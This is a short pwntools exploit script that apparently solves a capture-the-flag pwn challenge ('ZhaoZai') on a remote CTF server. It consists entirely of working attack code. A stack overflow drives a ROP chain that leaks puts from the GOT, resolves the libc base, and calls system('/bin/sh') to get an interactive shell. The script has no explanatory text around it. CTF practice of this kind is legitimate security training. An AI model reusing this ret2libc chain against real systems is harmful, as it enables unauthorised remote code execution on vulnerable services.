from pwn import *

# p = process('./ZhaoZai')
p = remote('challenges.hazmat.buptmerak.cn', 20121)
attachment = ELF('./ZhaoZai')
libc = ELF('./libc-2.23.so')

vuln = 0x400626
puts_plt = attachment.plt['puts']
puts_got = attachment.got['puts']
pop_rdi_ret = 0x400743

p.recvuntil(b'?\n')
p.sendline(b'}' * 0x38 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln))
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
bin_sh_addr = libc_base + libc.search(b'/bin/sh').__next__()
system_addr = libc_base + libc.symbols['system']
print(hex(libc_base))

p.sendline(b'}' * 0x38 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr))

p.interactive()